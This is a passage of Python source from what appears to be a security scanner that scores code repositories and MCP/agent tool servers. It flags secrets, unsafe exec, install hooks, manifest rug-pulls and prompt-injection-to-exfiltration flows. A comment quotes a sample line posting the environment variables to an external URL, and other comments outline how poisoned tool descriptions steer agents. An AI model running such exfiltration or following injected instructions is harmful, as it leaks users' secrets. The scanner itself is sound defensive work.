    m = re.search(r"""open\s*\(\s*['"]([^'"]+)['"]""", stripped)
    if m:
        target_path = m.group(1)
        target_ext = Path(target_path).suffix.lower()
        if target_ext in _CONFIG_FILE_EXTENSIONS:
            return True
        # Writing to a safe directory based on path components
        target_parts = Path(target_path).parts
        if any(p.lower() in _SAFE_WRITE_DIRS for p in target_parts):
            return True

    return False


def _downgrade_fs_severity(
    line: str, severity: str,
) -> str:
    """Downgrade fs_access severity for safer patterns like pathlib usage."""
    stripped = line.strip()
    # pathlib.Path usage is generally safer than raw open() — sandboxed by design
    if "Path(" in stripped or "pathlib" in stripped:
        if severity == "high":
            return "medium"
        if severity == "medium":
            return "low"
    return severity


def _upgrade_shell_true_severity(
    line: str, severity: str,
) -> str:
    """Upgrade severity when shell=True is present — always dangerous."""
    stripped = line.strip()
    if "shell=True" in stripped or "shell = True" in stripped:
        # shell=True is always critical regardless of original severity
        return "critical"
    return severity


def _scan_content(
    content: str, file_path: str,
    allowlist: set[tuple[str, str]] | None = None,
) -> tuple[list[Finding], list[str], int]:
    """Scan file content for security issues and positive signals.

    Returns (findings, positive_signals, suppressed_count).
    """
    findings: list[Finding] = []
    positives: list[str] = []
    suppressed_count = 0
    if allowlist is None:
        allowlist = set()

    is_test_or_doc = _is_test_or_doc_file(file_path)
    # CI/infra files (#3) are graded like tests/docs so a Dockerfile / workflow recipe
    # can't dominate the grade with a critical.
    is_infra = _is_infra_file(file_path)
    # Findings in tests/docs/infra are downgraded (never suppressed).
    is_downgraded = is_test_or_doc or is_infra
    # Per-file language for language-specific pattern dispatch (#2).
    file_lang = _EXT_TO_LANG.get(Path(file_path).suffix.lower())
    # Manifest / skill files ARE the tool's instruction surface — never downgrade
    # prompt-injection / hidden-unicode there even if they look doc-ish.
    is_metadata = Path(file_path).name.lower() in AGENT_METADATA_FILES
    lines = content.split("\n")

    for line_num, line in enumerate(lines, 1):
        # Skip comments (basic heuristic)
        stripped = line.strip()
        if stripped.startswith(("#", "//", "*", "/*")):
            continue
        # NOTE: (#6) we deliberately do NOT skip an entire line just because it contains
        # the word "example"/"placeholder" — that let an attacker neutralize any rule with
        # `# example` and silently ignored real code like
        # `requests.post("https://example.com/collect", data=os.environ)`. Placeholder
        # handling is now scoped to the matched secret VALUE only (see the secret loop).

        # --- Option 1: Inline suppression ---
        # If the line contains "ag-scan:ignore", skip pattern checks but
        # count it — excessive suppression is suspicious.
        # Track the line for severity-weighted penalty calculation later.
        if _SUPPRESSION_COMMENT in line:
            suppressed_count += 1
            continue

        # Check secrets
        for name, pattern, severity in SECRET_PATTERNS:
            match = pattern.search(line)
            if match:
                # Extra filter: skip if it's in a .env.example or test file
                if ".example" in file_path or "test" in file_path.lower():
                    continue
                # Skip if the MATCHED VALUE is clearly a placeholder (not the whole line).
                # The captured secret value (group 1 when present, else the full match).
                val = match.group(1) if match.groups() else match.group()
                val_lower = val.lower()
                if val in ("YOUR_API_KEY", "your_api_key", "xxx", "changeme") or any(
                    tok in val_lower for tok in ("example", "placeholder", "your_api_key")
                ):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="secret",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=_redact_secret(stripped[:120], match),
                ))
                break  # one finding per line for secrets

        # Check unsafe exec
        for name, pattern, severity in UNSAFE_EXEC_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2): skip a language-specific pattern on a
                # non-matching file (e.g. Python exec() on a .mjs file).
                if not _lang_ok(name, file_lang):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # --- Option 3: Context-aware check ---
                if _is_safe_exec_context(line, name, file_path):
                    continue
                # Downgrade severity in test/doc/infra files
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                # Upgrade severity for shell=True (always dangerous)
                effective_severity = _upgrade_shell_true_severity(
                    line, effective_severity,
                )
                findings.append(Finding(
                    category="unsafe_exec",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check insecure deserialization (#7) — RCE class; NOT discounted for MCP
        for name, pattern, severity in INSECURE_DESERIALIZATION_PATTERNS:
            if pattern.search(line):
                if not _lang_ok(name, file_lang):
                    continue
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="insecure_deserialization",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check file system access
        for name, pattern, severity in FS_ACCESS_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2)
                if not _lang_ok(name, file_lang):
                    continue
                # --- Option 2: Allowlist check ---
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # --- Option 3: Context-aware check ---
                if _is_safe_fs_context(line, name, file_path):
                    continue
                # Downgrade severity in test/doc/infra files
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                # Downgrade for safer pathlib patterns
                effective_severity = _downgrade_fs_severity(
                    line, effective_severity,
                )
                findings.append(Finding(
                    category="fs_access",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check data exfiltration
        for name, pattern, severity in EXFILTRATION_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="exfiltration",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check dynamic remote payload / rug-pull (external-URL-swap)
        for name, pattern, severity in DYNAMIC_REMOTE_LOAD_PATTERNS:
            if pattern.search(line):
                # Language dispatch (#2) — untagged patterns (e.g. curl|sh) stay agnostic.
                if not _lang_ok(name, file_lang):
                    continue
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # Downgrade in test/doc/infra files like other groups
                effective_severity = severity
                if is_downgraded and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check invisible / smuggled Unicode (dangerous anywhere — no downgrade)
        for name, pattern, severity in INVISIBLE_UNICODE_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="hidden_unicode",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check prompt injection / tool-description poisoning
        for name, pattern, severity in PROMPT_INJECTION_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                # Downgrade in test/doc/infra files — EXCEPT manifest/skill metadata,
                # which is the actual attack surface (a poisoned description is not a doc).
                effective_severity = severity
                if is_downgraded and not is_metadata and severity in ("critical", "high"):
                    effective_severity = "medium"
                findings.append(Finding(
                    category="prompt_injection",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check code obfuscation
        for name, pattern, severity in OBFUSCATION_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="obfuscation",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

    # Split fetch->exec across lines: a network read + an exec sink co-occurring in
    # one file is the classic rug-pull loader the per-line scan can't see. Fire only
    # when they're within ~40 lines of each other (keeps the composite finding tight).
    if not is_downgraded and NET_READ_RE.search(content) and EXEC_SINK_RE.search(content):
        net_lines = [i for i, ln in enumerate(lines) if NET_READ_RE.search(ln)]
        exec_lines = [i for i, ln in enumerate(lines) if EXEC_SINK_RE.search(ln)]
        if net_lines and exec_lines and any(
            abs(n - e) <= 40 for n in net_lines for e in exec_lines
        ):
            findings.append(Finding(
                category="dynamic_remote_load",
                name="Remote fetch + dynamic exec in same file (possible rug-pull)",
                severity="high",
                file_path=file_path,
                line_number=min(net_lines) + 1,
                snippet="network read + exec sink co-occur — remote payload may be swappable",
            ))

    # Manifest command/args rug-pull (#4, MCPoison) — structural, not per-line
    if is_metadata and Path(file_path).name.lower().endswith(".json"):
        findings.extend(_scan_manifest_exec(content, file_path))

    # Toxic-flow / lethal-trifecta composition (#9) — whole-file capability co-occurrence
    findings.extend(_composite_findings(content, file_path, lines, is_downgraded, allowlist))

    # Add remediation hints to all findings
    for f in findings:
        if not f.remediation:
            f.remediation = _REMEDIATION_HINTS.get(f.category, "Review and address this finding")

    # Check positive signals per-line, skipping comments and examples
    # (same filtering as negative patterns to prevent comment-trick gaming)
    for line in lines:
        stripped_pos = line.strip()
        if not stripped_pos:
            continue
        if stripped_pos.startswith(("#", "//", "*", "/*")):
            continue
        if "example" in stripped_pos.lower() or "placeholder" in stripped_pos.lower():
            continue
        for name, pattern in AUTH_POSITIVE_PATTERNS:
            if pattern.search(stripped_pos):
                positives.append(name)

    return findings, positives, suppressed_count


def _scan_dependencies(content: str, file_path: str) -> list[Finding]:
    """Scan dependency files for known vulnerable package versions.

    Parses requirements.txt, pyproject.toml, package.json, etc. and checks
    against a curated list of packages with known critical CVEs.
    """
    findings: list[Finding] = []
    filename = Path(file_path).name.lower()

    if filename not in {f.lower() for f in _DEP_FILES}:
        return findings

    for pkg_name, vuln_pattern, severity, description in _VULN_DEPS:
        # Search the entire file content for vulnerable version patterns
        for line_num, line in enumerate(content.split("\n"), 1):
            stripped = line.strip()
            # Skip comments
            if stripped.startswith(("#", "//", "*")):
                continue
            if vuln_pattern.search(stripped):
                findings.append(Finding(
                    category="dependency",
                    name=f"Vulnerable dependency: {pkg_name}",
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    remediation=description,
                ))
                break  # one finding per package per file

    # --- Install-script analysis (#5) — npm lifecycle hooks run on `npm install` ---
    if filename == "package.json":
        findings.extend(_scan_install_hooks(content, file_path))

    return findings


def _iter_command_specs(node):
    """Yield every {command, args} object nested anywhere in a parsed manifest."""
    if isinstance(node, dict):
        if isinstance(node.get("command"), str):
            args = node.get("args")
            args_str = " ".join(str(a) for a in args) if isinstance(args, list) else ""
            yield f"{node['command']} {args_str}".strip()
        for value in node.values():
            yield from _iter_command_specs(value)
    elif isinstance(node, list):
        for value in node:
            yield from _iter_command_specs(value)


def _scan_manifest_exec(content: str, file_path: str) -> list[Finding]:
    """#4 — inspect an MCP manifest's command/args for rug-pull exec (CVE-2025-54136).

    A mutable mcp.json/server.json whose command launches an inline interpreter-eval or
    pipes a remote fetch to a shell is the MCPoison vector: the client re-reads the file,
    so a swapped command runs on re-launch. Structural (parses JSON), not line-by-line.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    seen: set[tuple[str, str]] = set()
    for command_line in _iter_command_specs(data):
        for name, pattern, severity in MANIFEST_EXEC_PATTERNS:
            if pattern.search(command_line):
                if (name, command_line) in seen:
                    continue
                seen.add((name, command_line))
                findings.append(Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=1,
                    snippet=command_line[:120],
                ))
                break  # one finding per command spec
    return findings


def _scan_install_hooks(content: str, file_path: str) -> list[Finding]:
    """#5 — flag npm pre/post/install lifecycle scripts (a top supply-chain vector).

    These run automatically on `npm install`. Presence alone is a medium signal; a hook
    that fetches/pipes-to-shell/evals is escalated to critical.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    scripts = data.get("scripts") if isinstance(data, dict) else None
    if not isinstance(scripts, dict):
        return findings
    for hook in NPM_INSTALL_HOOKS:
        cmd = scripts.get(hook)
        if not isinstance(cmd, str) or not cmd.strip():
            continue
        if INSTALL_SCRIPT_DANGER_RE.search(cmd):
            severity, label = "critical", "runs remote/shell/eval content"
        else:
            severity, label = "medium", "auto-runs on install"
        findings.append(Finding(
            category="install_hook",
            name=f"npm '{hook}' lifecycle script ({label})",
            severity=severity,
            file_path=file_path,
            line_number=1,
            snippet=f"{hook}: {cmd}"[:120],
            remediation=_REMEDIATION_HINTS["install_hook"],
        ))
    return findings


def _canonical_tool_digest(content: str, file_path: str) -> str | None:
    """#8 — canonical sha256 of an agent/tool definition file, for drift-pinning.

    Returns None for non-metadata files. JSON manifests (mcp.json/server.json/
    ai-plugin.json) are canonicalized (sorted keys, no whitespace) so reformatting
    is NOT drift — only a semantic change to the tool definition is. Markdown/text
    (SKILL.md, agents.md) is line-normalized (strip trailing ws, collapse blank ends).
    """
    name = Path(file_path).name.lower()
    if name not in AGENT_METADATA_FILES:
        return None
    if name.endswith(".json"):
        try:
            obj = json.loads(content)
            canon = json.dumps(
                obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False,
            )
        except (ValueError, TypeError):
            canon = "\n".join(ln.rstrip() for ln in content.splitlines())
    else:
        canon = "\n".join(ln.rstrip() for ln in content.splitlines()).strip("\n")
    return "sha256:" + hashlib.sha256(canon.encode("utf-8")).hexdigest()


def _compute_manifest_digest(tool_digests: dict[str, str]) -> str | None:
    """Combine per-file tool digests into one manifest digest for the attestation."""
    if not tool_digests:
        return None
    joined = "\n".join(f"{p}={tool_digests[p]}" for p in sorted(tool_digests))
    return "sha256:" + hashlib.sha256(joined.encode("utf-8")).hexdigest()


def _composite_findings(
    content: str,
    file_path: str,
    lines: list[str],
    is_test_or_doc: bool,
    allowlist: object,
) -> list[Finding]:
    """#9 — the lethal trifecta: private-data read + untrusted input + outbound send.

    Each capability is benign alone; together in one tool they form the prompt-injection
    → exfiltration chain (Willison's "lethal trifecta"; the Invariant GitHub-MCP exploit).
    We require ALL THREE legs present to keep precision high — a pure API wrapper that
    reads an env key and posts to one endpoint, with no untrusted-content ingestion,
    does NOT trigger. Emits at most one finding per file.
    """
    # Cheap pre-check on the whole blob before the per-line pass
    if not (
        UNTRUSTED_INPUT_RE.search(content)
        and OUTBOUND_SEND_RE.search(content)
        and (SENSITIVE_READ_RE.search(content) or FILE_READ_RE.search(content))
    ):
        return []

    def _hits(rx: re.Pattern[str]) -> list[int]:
        out = []
        for i, ln in enumerate(lines):
            stripped = ln.strip()
            if not stripped or stripped.startswith(("#", "//", "*", "/*")):
                continue
            if rx.search(ln):
                out.append(i + 1)
        return out

    untrusted = _hits(UNTRUSTED_INPUT_RE)
    outbound = _hits(OUTBOUND_SEND_RE)
    sensitive = _hits(SENSITIVE_READ_RE)
    file_read = _hits(FILE_READ_RE)
    if not (untrusted and outbound and (sensitive or file_read)):
        return []

    # Precision: the read and the outbound send must be NEAR each other (a plausible
    # flow), not just co-present somewhere in a big file. A 2000-line HTTP-client lib
    # legitimately reads proxy env, parses responses, and makes requests in unrelated
    # places — that whole-file co-occurrence is not a real exfil chain (the requests
    # false-"high"). Require a read↔send pair within a small window.
    _prox = 45

    def _near(reads: list[int], sends: list[int]) -> int | None:
        for r in reads:
            for s in sends:
                if abs(r - s) <= _prox:
                    return min(r, s)
        return None

    if _near(sensitive, outbound) is None and _near(file_read, outbound) is None:
        return []
    # Prefer the sensitive-leg finding only if a sensitive read is actually near a send.
    if sensitive and _near(sensitive, outbound) is None:
        sensitive = []

    if sensitive:
        name = "Lethal trifecta: private-data read + untrusted input + outbound network"
        severity = "high"
        line = sensitive[0]
    else:
        name = "Toxic flow: file read + untrusted input + outbound network"
        severity = "medium"
        line = file_read[0]

    if _is_allowlisted(file_path, name, allowlist):
        return []
    if is_test_or_doc and severity in ("critical", "high"):
        severity = "medium"

    return [Finding(
        category="toxic_flow",
        name=name,
        severity=severity,
        file_path=file_path,
        line_number=line,
        snippet="capability composition — each part benign alone, dangerous together",
    )]


_DEP_CATEGORIES = frozenset({"dependency", "install_hook"})
# Dependency/supply-chain vulns are a real but non-disqualifying signal *until*
# reachability (direct-prod vs transitive-dev) is known — so their penalty is
# capped and saturating, never a false-F. A known-malicious (OpenSSF MAL)
# package is the exception: malicious code in the dep tree is disqualifying.
_DEP_VULN_CAP = 18       # max points a repo can lose to CVE-class dep findings
_DEP_MAL_PENALTY = 70    # a MAL match forces the grade down hard


def _dependency_penalty(findings: list[Finding]) -> int:
    """Bounded, saturating penalty for dependency/supply-chain vulns.

    Diminishing returns per severity (the 1st vuln hurts most), capped at
    ``_DEP_VULN_CAP`` for CVE-class findings so a monorepo's transitive vulns
    can't false-flip a healthy package to F. A known-malicious package short-
    circuits to ``_DEP_MAL_PENALTY``."""
    deps = [f for f in findings if f.category in _DEP_CATEGORIES]
    if not deps:
        return 0
    if any(f.name.startswith("Known-malicious") for f in deps):
        return _DEP_MAL_PENALTY
    crit = sum(1 for f in deps if f.severity == "critical")
    high = sum(1 for f in deps if f.severity == "high")
    med = sum(1 for f in deps if f.severity == "medium")

    def _sat(n: int, cap: float) -> float:
        return cap * (1 - 0.5 ** n) if n > 0 else 0.0

    penalty = _sat(crit, 12) + _sat(high, 8) + _sat(med, 4)
    return int(min(penalty, _DEP_VULN_CAP))


def _certified_status(result: ScanResult) -> dict:
    """A+ 'Certified' eligibility — the 6-point conjunctive gate (roadmap §7). ALL
    must hold. Dormant (eligible=False) while artifact-scan/provenance are off —
    by design, A+ requires the cryptographic signals. Purely additive: this only
    gates the top A+ label, it never lowers a grade."""
    cov = result.coverage or {}
    prov = result.provenance or {}
    drift = result.drift or {}
    checks = {
        # 1. we scanned the published artifact, not just the repo
        "artifact_scanned": cov.get("scan_depth") in ("artifact", "artifact+live"),
        # 2. build provenance cryptographically binds artifact -> source
        "provenance_verified": (
            bool(prov.get("verified")) and bool(prov.get("source_matches_claim"))
        ),
        # 3. the published artifact matches its source (no injected/added files, no hook)
        "no_drift": not (
            drift.get("added_files") or drift.get("modified_files")
            or drift.get("has_install_hook")
        ),
        # 4. zero critical/high across code + supply-chain, and no known-malicious dep
        "no_critical_or_high": (
            result.critical_count == 0 and result.high_count == 0
            and not any(f.name.startswith("Known-malicious") for f in result.findings)
        ),
        # 5. a signed, recomputable verdict (coverage block with pinned snapshots)
        "recompute_ready": bool(cov),
        # 6. no material coverage gaps (not a sampled / truncated scan)
        "full_coverage": not getattr(result, "sampled", False),
    }
    return {"eligible": all(checks.values()), "checks": checks}


def _calculate_trust_score(result: ScanResult) -> int:
    """Calculate a trust score (0-100) based on findings and signals.

    Score considers:
    - Code finding counts by severity (deductions)
    - Dependency/supply-chain vulns via a separate bounded penalty
    - Positive security signals (bonuses)
    - Good practices: README, LICENSE, tests (bonuses)
    - File ratio: if findings are concentrated in few files, reduce penalty
    """
    # Dependency vulns are scored separately (bounded); the general severity
    # model applies only to first-party CODE findings.
    code_findings = [f for f in result.findings if f.category not in _DEP_CATEGORIES]
    # Weight by shipped-vs-non-shipped: a finding in tests/fixtures/examples counts at
    # a fraction, so a big monorepo's test noise can't tank the grade of what it ships.
    code_critical = sum(_finding_grade_weight(f) for f in code_findings if f.severity == "critical")
    code_high = sum(_finding_grade_weight(f) for f in code_findings if f.severity == "high")
    code_medium = sum(_finding_grade_weight(f) for f in code_findings if f.severity == "medium")

    # Clean repos start higher — no findings means the code passed review. The <0.5
    # threshold keeps a repo whose only issues are a few test-file findings at 80.
    total_findings = code_critical + code_high + code_medium
    score = 80 if total_findings < 0.5 else 70

    # For MCP servers and media/audio tools, discount expected patterns
    # These are intentional capabilities, not vulnerabilities
    if result.is_mcp_server or result.is_media_tool:
        expected_categories = (
            {"fs_access", "unsafe_exec"} if result.is_mcp_server else {"fs_access"}
        )
        actual_critical = sum(
            1 for f in code_findings
            if f.severity == "critical" and f.category not in expected_categories
        )
        actual_high = sum(
            1 for f in code_findings
            if f.severity == "high" and f.category not in expected_categories
        )
        actual_medium = sum(
            1 for f in code_findings
            if f.severity == "medium" and f.category not in expected_categories
        )
        # Count expected patterns at 10% weight (not zero — they still matter)
        expected_medium = code_medium - actual_medium
        expected_high = code_high - actual_high
        raw_deduction = (
            actual_critical * 15
            + actual_high * 8
            + actual_medium * 3
            + int(expected_high * 0.8)  # 10% of normal penalty
            + int(expected_medium * 0.3)
        )
    else:
        # Standard deductions for non-MCP repos (code findings only)
        raw_deduction = (
            code_critical * 15
            + code_high * 8
            + code_medium * 3
        )

    # File-ratio scaling: if only a small percentage of files have issues,
    # reduce the deduction. A repo with 200 files and 5 findings in 3 files
    # should not be penalized as harshly as one with findings in 50% of files.
    if result.files_scanned > 0 and total_findings > 0:
        affected_files = len({f.file_path for f in code_findings})
        ratio = affected_files / result.files_scanned
        # Scale factor: 0.4 at 1% affected, 1.0 at 25%+ affected
        scale = min(1.0, 0.4 + ratio * 2.4)
        raw_deduction = int(raw_deduction * scale)

    score -= raw_deduction

    # Dependency/supply-chain vulns — separate bounded penalty (see helper).
    score -= _dependency_penalty(result.findings)

    # Phase 3 provenance/signing — a separate, additive signal (Kenne decision #4).
    # verified build provenance = small bonus; a package that CLAIMS provenance but
    # fails verification = small penalty; absent = 0 (N/A, never penalized). Empty
    # for scans without a package coordinate / with the flag off, so grades of
    # packages without provenance are unchanged.
    if isinstance(result.provenance, dict):
        score += int(result.provenance.get("score_delta", 0) or 0)

    # Phase 5 maintainer/behavioral — a separate, BOUNDED negative signal only
    # (Phase-5 policy). Clear negatives (archived/abandoned) deduct a small, capped
    # number of points; positives are folded into positive_signals above (so they
    # go through the standard +5-each bonus). Absent/unreadable → 0, never a
    # penalty; empty for scans with the flag off, so grades are unchanged.
    if isinstance(result.maintainer, dict):
        score += int(result.maintainer.get("score_delta", 0) or 0)

    # Bonuses for positive signals (capped at +35)
    unique_positives = set(result.positive_signals)
    score += min(len(unique_positives) * 5, 35)

    # Bonuses for good practices
    if result.has_readme:
        score += 5
    if result.has_license:
        score += 5
    if result.has_tests:
        score += 5

    # Penalty for inline suppression (gaming deterrent)
    # First 3 are free (legitimate false-positive suppression).
    # After that, -3 per suppression — even moderate suppression is suspicious.
    # Rationale: hiding a critical saves 15pts but costs 3pts — still net positive
    # for the attacker, but much less favorable than the old 10-free / -2 scheme.
    if result.suppressed_count > 3:
        excess = result.suppressed_count - 3
        score -= excess * 3

    return max(0, min(100, int(round(score))))


def _calculate_category_scores(result: ScanResult) -> dict[str, int]:
    """Calculate per-category sub-scores (0-100) as independent axes.

    Categories: secret_hygiene, code_safety, data_handling, filesystem_access.
    Each starts at 100 and deducts based on severity-weighted findings.
    """
    # Map finding categories to score categories
    category_map = {
        "secret": "secret_hygiene",
        "unsafe_exec": "code_safety",
        "obfuscation": "code_safety",
        "dynamic_remote_load": "code_safety",
        "hidden_unicode": "code_safety",
        "prompt_injection": "code_safety",
        "insecure_deserialization": "code_safety",
        "exfiltration": "data_handling",
        "toxic_flow": "data_handling",
        "fs_access": "filesystem_access",
        "dependency": "dependency_health",
        "install_hook": "dependency_health",
        # Phase 2: repo↔artifact drift (injected/modified files) is a code-safety axis.
        "artifact_drift": "code_safety",
    }
    severity_weights = {"critical": 25, "high": 15, "medium": 8, "low": 3}

    scores: dict[str, int] = {
        "secret_hygiene": 100,
        "code_safety": 100,
        "data_handling": 100,
        "filesystem_access": 100,
        "dependency_health": 100,
    }

    # For MCP servers and media/audio tools, expected patterns get discounted
    expected_mcp_categories = {"unsafe_exec", "fs_access"} if result.is_mcp_server else set()
    # Media/TTS/audio tools legitimately read/write files
    if result.is_media_tool:
        expected_mcp_categories.add("fs_access")

    for finding in result.findings:
        # Dependency/supply-chain vulns use the bounded model below, not the
        # linear per-finding deduction (which would floor a monorepo to 0).
        if finding.category in _DEP_CATEGORIES:
            continue
        score_cat = category_map.get(finding.category)
        if score_cat:
            deduction: float = severity_weights.get(finding.severity, 3)
            # Discount expected MCP patterns to 10% of normal penalty
            if finding.category in expected_mcp_categories and finding.severity != "critical":
                deduction = max(1, int(deduction) // 10)
            # Non-shipped code (tests/fixtures/examples) counts at a fraction, so a
            # monorepo's test noise doesn't tank the category axes either.
            deduction *= _finding_grade_weight(finding)
            scores[score_cat] = max(0.0, scores[score_cat] - deduction)

    # dependency_health mirrors the bounded overall dependency penalty so the
    # category card and the grade tell the same story.
    scores["dependency_health"] = max(0, 100 - _dependency_penalty(result.findings))

    return {k: int(round(v)) for k, v in scores.items()}


def _dedupe_regex_vs_osv(result: ScanResult, osv_findings: list[Finding]) -> None:
    """Drop legacy regex ``dependency`` findings that OSV already covers.

    OSV findings name a concrete ``pkg@version (VULN-ID)``; the regex findings are
    ``Vulnerable dependency: <pkg>``. When OSV has flagged package ``X`` we remove
    the coarser regex finding for ``X`` so the same package isn't double-counted
    against the dependency subscore. Regex findings for packages OSV didn't cover
    (e.g. a range-only manifest with no lockfile pin) are kept.
    """
    osv_pkgs: set[str] = set()
    for f in osv_findings:
        # name form: "... : <name>@<version> (<id>)" — take the token before '@'.
        after_colon = f.name.split(": ", 1)[-1]
        pkg = after_colon.split("@", 1)[0].strip().lower()
        if pkg:
            osv_pkgs.add(pkg)
    if not osv_pkgs:
        return

    def _regex_pkg(f: Finding) -> str | None:
        if f.category != "dependency" or "Vulnerable dependency:" not in f.name:
            return None
        return f.name.split(":", 1)[-1].strip().lower()

    result.findings = [
        f for f in result.findings
        if not (_regex_pkg(f) is not None and _regex_pkg(f) in osv_pkgs)
    ]


async def _run_supply_chain(
    result: ScanResult,
    owner: str,
    repo: str,
    tree: list[dict],
    token: str | None,
    ref: str | None,
    sem,
    per_file_timeout: float,
) -> None:
    """Phase 0 coverage block + Phase 1 OSV supply-chain pass (fail-open).

    Always attaches the Phase-0 ``coverage`` block (recompute discipline). When
    ``settings.scanner_use_osv`` is on it additionally fetches the repo's real
    lockfiles + workflow YAMLs, runs the OSV/deps.dev/Scorecard pipeline, folds
    the resulting CVE/GHSA/MAL findings into the scan, and pins every DB snapshot
    date into ``coverage.db_snapshots``. Any failure leaves the legacy regex
    findings untouched.
    """
    import asyncio

    from src.config import settings
    from src.scanner.coverage import (
        SCAN_DEPTH_REPO_ONLY,
        build_coverage,
        build_evidence_anchors,
    )

    repo_url = f"https://github.com/{owner}/{repo}"
    db_snapshots: dict[str, str] = {}
    sc_summary: dict = {}

    if getattr(settings, "scanner_use_osv", True):
        try:
            from src.scanner.supply_chain import analyze_supply_chain

            # Reuse the tree + raw fetch to pull lockfiles and workflow YAMLs.
            lock_names = {
                "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
                "requirements.txt", "poetry.lock", "pipfile.lock",
                "cargo.lock", "go.sum",
            }
            lock_items = [
                it for it in tree
                if Path(it["path"]).name.lower() in lock_names
                and not _should_skip_path(it["path"])
                and _is_production_lockfile(it["path"])
            ][: settings.scanner_supply_chain_max_lockfiles]
            wf_items = [
                it for it in tree
                if it["path"].startswith(".github/workflows/")
                and it["path"].lower().endswith((".yml", ".yaml"))
            ][: settings.scanner_supply_chain_max_workflows]

            async def _fetch(path: str) -> tuple[str, str]:
                try:
                    async with sem:
                        content = await asyncio.wait_for(
                            _fetch_file_content(owner, repo, path, token, ref=ref),
                            timeout=per_file_timeout,
                        )
                    return path, content or ""
                except (asyncio.TimeoutError, Exception):
                    return path, ""

            fetch_tasks = [_fetch(it["path"]) for it in (lock_items + wf_items)]
            fetched = await asyncio.gather(*fetch_tasks) if fetch_tasks else []
            lockfiles = {
                p: c for p, c in fetched
                if Path(p).name.lower() in lock_names and c
            }
            workflow_texts = [
                c for p, c in fetched
                if p.startswith(".github/workflows/") and c
            ]

            sc = await analyze_supply_chain(
                lockfiles,
                owner=owner,
                repo=repo,
                workflow_texts=workflow_texts,
                use_depsdev=getattr(settings, "scanner_use_depsdev", True),
                use_scorecard=getattr(settings, "scanner_use_scorecard", True),
            )

            # Dedupe identical vulns that repeat across multiple lockfiles — the
            # same CVE on the same package@version must count once, not per-file.
            # The finding ``name`` encodes "<kind>: <pkg>@<version> (<vuln_id>)",
            # so it uniquely identifies a vuln — dedupe on it so the same CVE
            # repeated across lockfiles counts once.
            _seen_vulns: set = set()
            osv_findings = []
            for d in sc.findings:
                f = Finding(**d)
                if f.name in _seen_vulns:
                    continue
                _seen_vulns.add(f.name)
                osv_findings.append(f)

            advisory = getattr(settings, "scanner_osv_advisory", True)
            scored = False
            if sc.ok and osv_findings and not advisory:
                # Fold supply-chain findings into the scored grade only once the
                # aggregation is validated (advisory=False). Until then they are
                # collected + signed + surfaced but do not deduct.
                _dedupe_regex_vs_osv(result, osv_findings)
                result.findings.extend(osv_findings)
                scored = True
            if sc.ok and sc.deps_total and not any(
                p == "Dependency pinning" for p in result.positive_signals
            ):
                result.positive_signals.append("Dependency pinning")
            db_snapshots = dict(sc.db_snapshots)
            sc_summary = {
                "ok": sc.ok,
                "advisory": advisory,
                "scored": scored,
                "deps_total": sc.deps_total,
                "lockfiles_scanned": len(lockfiles),
                "unique_vulns": len(osv_findings),
                "ecosystems": sc.ecosystems,
                "counts": sc.counts,
                "malicious": sc.malicious,
                "scorecard": sc.scorecard,
                "github_depth": sc.github_depth,
                "db_snapshots": sc.db_snapshots,
            }
        except Exception:
            logger.warning(
                "Supply-chain pass errored for %s/%s — keeping regex deps",
                owner, repo, exc_info=True,
            )

    # Phase 0 coverage block — always emitted (recompute discipline).
    result.coverage = build_coverage(
        surface="github",
        repo_url=repo_url,
        commit=ref,
        scan_depth=SCAN_DEPTH_REPO_ONLY,
        db_snapshots=db_snapshots,
    )
    result.coverage["evidence_anchors"] = build_evidence_anchors()
    result.supply_chain = sc_summary


async def _maybe_scan_artifact(
    result: ScanResult,
    owner: str,
    repo: str,
    tree: list[dict],
